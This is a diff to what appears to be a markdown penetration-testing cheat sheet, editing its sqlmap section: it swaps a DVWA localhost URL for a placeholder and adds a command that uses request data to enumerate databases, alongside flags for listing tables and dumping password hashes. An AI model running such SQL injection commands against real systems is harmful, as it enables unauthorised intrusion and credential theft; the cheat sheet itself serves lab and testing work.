@@ -549,12 +549,16 @@ SELECT * FROM demo;							# get all from the new table
 ```
 git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev		# clone sqlmap latest dev
 
-python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=555&Submit=Submit#" --cookie="<COOKIE/SESSION_ID_1>; <COOKIE/SESSION_ID_N" --tables --batch
+python3 sqlmap.py -u "<TARGET_URL>" --cookie="<COOKIE/SESSION_ID_1>; <COOKIE/SESSION_ID_N" --tables --batch
 
 --batch 			# !!! this will choose the default options when running a scan . Best not to use as it may start trying to crack password
 --schema 			# Enumerate the DB schema
 --tables 			# Enumerate the DB tables
 --password			# Enumerate DBMS users password hashes
+
+python3 sqlmap.py -u "<TARGET_URL>" --cookie="<COOKIE/SESSION_ID_1>; <COOKIE/SESSION_ID_N" --data="<REQUEST_DATA>" -p <PARAM> --dbs
+
+---dbs 				# Enumerate the DBMS data bases
 ```
 
 ### Dealing with hashes
